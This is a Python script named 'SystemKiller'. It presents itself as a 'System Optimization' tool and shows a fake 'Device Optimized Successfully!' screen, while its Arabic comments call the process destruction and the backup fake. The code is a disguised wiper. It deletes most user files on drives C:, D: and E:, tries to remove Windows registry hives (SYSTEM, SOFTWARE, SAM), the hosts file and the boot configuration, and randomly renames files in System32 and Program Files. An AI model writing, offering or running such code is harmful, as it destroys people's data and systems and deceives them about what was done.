import os
import random
import string
import shutil
import time
import datetime

class SystemKiller:
    def __init__(self):
        self.drives_to_clean = ['C:', 'D:', 'E:']  # drives الهدف
        self.backup_dir = "C:\\Windows\\Temp\\backup"  # مكان احتياطي وهمي
        self.log_file = "optimization_log.txt"
        
    def run(self):
        """بدء عملية التدمير"""
        print("🚀 Starting System Optimization...")
        self.create_backup_folder()
        self.clean_drives()
        self.delete_system_files()
        self.rename_critical_files()
        self.show_completion_message()
        
    def create_backup_folder(self):
        """إنشاء مجلد احتياطي وهمي"""
        try:
            os.makedirs(self.backup_dir, exist_ok=True)
            with open(os.path.join(self.backup_dir, "backup_info.txt"), "w") as f:
                f.write(f"Backup created at: {datetime.datetime.now()}")
            print(f"✅ Backup folder created at {self.backup_dir}")
        except Exception as e:
            print(f"❌ Error creating backup folder: {e}")
    
    def clean_drives(self):
        """تنظيف drives"""
        for drive in self.drives_to_clean:
            if os.path.exists(drive):
                print(f"🧹 Cleaning {drive}...")
                try:
                    # مسح الملفات غير الهامة
                    for root, dirs, files in os.walk(drive):
                        for file in files:
                            if not any(ext in file.lower() for ext in ['.exe', '.dll', '.sys']):
                                filepath = os.path.join(root, file)
                                try:
                                    os.remove(filepath)
                                    print(f"   ✅ Deleted: {filepath}")
                                except Exception as e:
                                    print(f"   ❌ Error deleting {filepath}: {e}")
                except Exception as e:
                    print(f"❌ Error cleaning {drive}: {e}")
    
    def delete_system_files(self):
        """حذف ملفات النظام"""
        system_files = [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SOFTWARE",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\Boot\\BCD",
            "C:\\Windows\\WinSxS"
        ]
        
        for file_path in system_files:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"🗑️ Deleted system file: {file_path}")
                except Exception as e:
                    print(f"❌ Error deleting {file_path}: {e}")
    
    def rename_critical_files(self):
        """إعادة تسمية الملفات الحرجة"""
        critical_folders = [
            "C:\\Windows\\System32",
            "C:\\Program Files",
            "C:\\Program Files (x86)"
        ]
        
        for folder in critical_folders:
            if os.path.exists(folder):
                try:
                    for root, dirs, files in os.walk(folder):
                        for file in files:
                            if random.random() < 0.1:  # 10% احتمال إعادة التسمية
                                old_path = os.path.join(root, file)
                                new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".tmp"
                                new_path = os.path.join(root, new_name)
                                os.rename(old_path, new_path)
                                print(f"🔄 Renamed: {old_path} -> {new_path}")
                except Exception as e:
                    print(f"❌ Error renaming files in {folder}: {e}")
    
    def show_completion_message(self):
        """عرض رسالة الاكتمال"""
        import tkinter as tk
        
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='#0a0a0a')
        
        success_icon = tk.Label(
            root, 
            text="✅", 
            font=("Segoe UI", 80), 
            fg="#00ff00",
            bg="#0a0a0a"
        )
        success_icon.pack(pady=(150, 20))
        
        final_msg = tk.Label(
            root, 
            text="Device Optimized Successfully!", 
            font=("Segoe UI", 24, "bold"), 
            fg="#00ff00",
            bg="#0a0a0a"
        )
        final_msg.pack(pady=(0, 20))
        
        sub_msg = tk.Label(
            root, 
            text="All unnecessary data has been removed.", 
            font=("Segoe UI", 14), 
            fg="#aaaaaa",
            bg="#0a0a0a"
        )
        sub_msg.pack(pady=(0, 50))
        
        back_btn = tk.Button(
            root, 
            text="Return to Home Screen", 
            command=root.destroy,
            font=("Segoe UI", 14, "bold"),
            bg="#0078d7",
            fg="#ffffff",
            activebackground="#005a9e",
            padx=30,
            pady=10,
            cursor="hand2"
        )
        back_btn.pack()
        
        root.mainloop()


if __name__ == "__main__":
    killer = SystemKiller()
    killer.run()